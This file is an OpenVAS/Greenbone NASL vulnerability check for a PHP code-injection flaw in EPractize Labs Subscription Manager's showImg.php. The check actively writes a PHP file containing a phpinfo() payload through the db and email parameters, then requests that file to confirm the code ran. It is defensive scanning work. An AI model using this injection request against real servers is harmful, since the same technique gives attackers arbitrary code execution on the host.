if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.103401" );
	script_bugtraq_id( 50919 );
	script_version( "2020-08-24T15:18:35+0000" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_name( "EPractize Labs Subscription Manager 'showImg.php' PHP Code Injection Vulnerability" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/50919" );
	script_xref( name: "URL", value: "http://www.epractizelabs.com/email-marketing/subscription-manager.html" );
	script_xref( name: "URL", value: "http://archives.neohapsis.com/archives/fulldisclosure/current/0118.html" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2012-01-26 12:49:25 +0100 (Thu, 26 Jan 2012)" );
	script_category( ACT_ATTACK );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2012 Greenbone Networks GmbH" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "summary", value: "EPractize Labs Subscription Manager is prone to a remote PHP code-
  injection vulnerability." );
	script_tag( name: "impact", value: "An attacker can exploit this issue to inject and execute arbitrary PHP
  code in the context of the affected application. This may facilitate a compromise of the application and
  the underlying system, other attacks are also possible." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure of
  this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
require("misc_func.inc.sc");
port = http_get_port( default: 80 );
if(!http_can_host_php( port: port )){
	exit( 0 );
}
for dir in nasl_make_list_unique( "/Subscribe", "/subscribe", http_cgi_dirs( port: port ) ) {
	if(dir == "/"){
		dir = "";
	}
	buf = http_get_cache( item: dir + "/index.php", port: port );
	if(ContainsString( buf, "<title> Mailing List" ) && ContainsString( buf, "eplform" )){
		vtstrings = get_vt_strings();
		file = vtstrings["lowercase_rand"] + ".php";
		url = dir + "/showImg.php?db=" + file + "&email=%3C?php%20phpinfo();%20?%3E";
		req = http_get( item: url, port: port );
		buf = http_keepalive_send_recv( port: port, data: req, bodyonly: FALSE );
		if(IsMatchRegexp( buf, "^HTTP/1\\.[01] 200" )){
			url = dir + "/" + file;
			if(http_vuln_check( port: port, url: url, pattern: "<title>phpinfo\\(\\)" )){
				report = http_report_vuln_url( port: port, url: url );
				security_message( port: port, data: report );
				exit( 0 );
			}
		}
	}
}
exit( 99 );

